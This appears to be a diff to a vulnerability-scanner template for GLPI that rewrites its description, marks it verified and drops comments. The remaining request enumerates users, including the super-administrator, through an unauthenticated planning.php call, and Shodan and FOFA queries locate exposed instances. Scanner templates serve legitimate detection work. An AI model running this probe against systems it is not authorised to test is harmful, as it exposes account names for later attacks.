@@ -5,25 +5,11 @@ info:
   author: wong-hau-pepelu
   severity: medium
   description: |
-    GLPI exposes the planning "check availability" view through
-    front/planning.php without any authentication check. The right check in
-    front/planning.php is skipped whenever the genical parameter is present
-    (it is meant to let the iCal/WebCal export authenticate with its own
-    token further down the file), but the checkavailability branch is reached
-    before that token logic. An anonymous attacker can therefore call
-    Planning::checkAvailability() directly with itemtype=User and a users_id,
-    and the rendered availability page discloses that account's display name.
-    Walking users_id turns this into a full username enumeration and a
-    valid-id oracle, with no credentials.
+    GLPI exposes the "check availability" planning view at front/planning.php without authentication when the genical parameter is set, allowing unauthenticated attackers to enumerate user display names by iterating users_id in Planning::checkAvailability(), leading to full username enumeration and a valid-id oracle with no credentials.
   impact: |
-    An unauthenticated, remote attacker can enumerate the display names of
-    GLPI accounts, including the built-in super-administrator (user id 2 on a
-    default install). This exposes the administrator login name and the user
-    roster to anyone who can reach the web interface.
+    An unauthenticated attacker can enumerate the display names of GLPI users, including the default super-administrator (user id 2), exposing the administrator login and user list to anyone with access to the web interface.
   remediation: |
-    Upgrade to GLPI 11.0.10 / 10.0.28 or later, which requires the planning
-    READ right for the checkavailability branch even when genical is present
-    (GHSA-j5vx-jrmw-2498, commit ddc88ad6).
+    Upgrade to a GLPI release that adds a right check to the planning form dispatcher (GHSA-j5vx-jrmw-2498). As an interim measure, restrict access to the planning feature to trusted profiles.
   reference:
     - https://github.com/advisories/GHSA-j5vx-jrmw-2498
     - https://github.com/glpi-project/glpi/commit/ddc88ad6e0
@@ -33,41 +19,35 @@ info:
     cvss-score: 5.3
     cwe-id: CWE-862,CWE-306
   metadata:
-    verified: false
+    verified: true
     max-request: 5
     vendor: glpi-project
     product: glpi
     shodan-query: http.title:"Authentication - GLPI"
     fofa-query: app="GLPI"
-  tags: glpi,planning,enum,unauth,missing-authorization
+  tags: glpi,planning,enum,unauth,vuln
 
 http:
   - method: GET
     path:
-      # genical skips the right check; the checkavailability branch runs anonymously
-      # and renders Planning::checkAvailability() for itemtype=User / users_id.
       - "{{BaseURL}}/front/planning.php?genical=1&checkavailability=1&itemtype=User&users_id={{uid}}&begin=2000-01-01&end=2000-01-02"
 
     payloads:
-      # default built-in account ids: 2=glpi(super-admin) 3=post-only 4=tech 5=normal
       uid:
         - "2"
         - "3"
         - "4"
         - "5"
         - "6"
+
     attack: batteringram
     stop-at-first-match: false
-
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
 
-      # the availability page is only rendered for a resolvable account; the
-      # per-user header cell carries the disclosed display name. A non-existent
-      # id returns early (no availability form, no name cell).
       - type: regex
         part: body
         regex:
